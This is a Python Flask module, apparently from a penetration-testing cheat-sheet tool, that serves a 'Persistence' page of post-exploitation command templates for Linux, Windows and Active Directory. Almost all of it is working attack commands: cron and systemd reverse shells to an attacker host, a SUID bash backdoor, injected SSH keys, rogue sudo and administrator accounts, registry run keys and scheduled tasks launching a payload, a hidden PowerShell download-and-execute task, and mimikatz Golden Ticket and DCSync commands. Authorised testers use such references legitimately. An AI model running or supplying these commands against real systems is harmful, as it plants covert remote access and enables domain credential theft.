from flask import Blueprint, render_template

bp = Blueprint("persistence", __name__)

CARDS = [
    {"title": "Linux — cron & services", "blocks": [
        {"tpl": "(crontab -l 2>/dev/null; echo '* * * * * bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1') | crontab -"},
        {"tpl": "echo '* * * * * root bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\"' > /etc/cron.d/bh"},
        {"tpl": "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash", "lbl": "suid backdoor"},
    ]},
    {"title": "Linux — ssh & accounts", "blocks": [
        {"tpl": "mkdir -p ~/.ssh && echo '<your-pubkey>' >> ~/.ssh/authorized_keys"},
        {"tpl": "useradd -m -s /bin/bash -G sudo $USER && echo '$USER:$PASS' | chpasswd"},
        {"tpl": "echo '$USER ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/bh"},
    ]},
    {"title": "Linux — systemd service", "blocks": [
        {"tpl": "printf '[Service]\\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\"\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/bh.service", "plain": True},
        {"tpl": "systemctl enable --now bh.service"},
    ]},
    {"title": "Windows — run keys & tasks", "blocks": [
        {"tpl": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v bh /t REG_SZ /d \"C:\\Windows\\Temp\\rev.exe\" /f"},
        {"tpl": "schtasks /create /tn bh /tr C:\\Windows\\Temp\\rev.exe /sc onlogon /rl highest /f"},
        {"tpl": "schtasks /create /tn bh /tr \"powershell -w hidden -c IEX(iwr http://$LHOST/r.ps1 -useb)\" /sc minute /mo 5 /f"},
    ]},
    {"title": "Windows — accounts & services", "blocks": [
        {"tpl": "net user $USER $PASS /add && net localgroup administrators $USER /add"},
        {"tpl": "sc create bh binPath= \"C:\\Windows\\Temp\\rev.exe\" start= auto & sc start bh"},
    ]},
    {"title": "AD / domain (high value)", "hint": "Note the technique; document for the report.", "blocks": [
        {"tpl": "# Golden Ticket: mimikatz kerberos::golden /user:Administrator /domain:$DOMAIN /sid:<sid> /krbtgt:<hash> /ptt", "plain": True},
        {"tpl": "# DCSync: mimikatz lsadump::dcsync /domain:$DOMAIN /user:krbtgt", "plain": True},
    ]},
]


@bp.route("/persistence")
def index():
    return render_template("cheat.html", active="persistence",
                           title="Persistence", tag="post-exploit",
                           intro="Re-entry mechanisms across Linux, Windows and AD. Document every change you make.",
                           cards=CARDS)


MODULE = {"id": "persistence", "title": "Persistence", "category": "Post-exploit",
          "order": 5, "blueprint": bp, "endpoint": "persistence.index"}
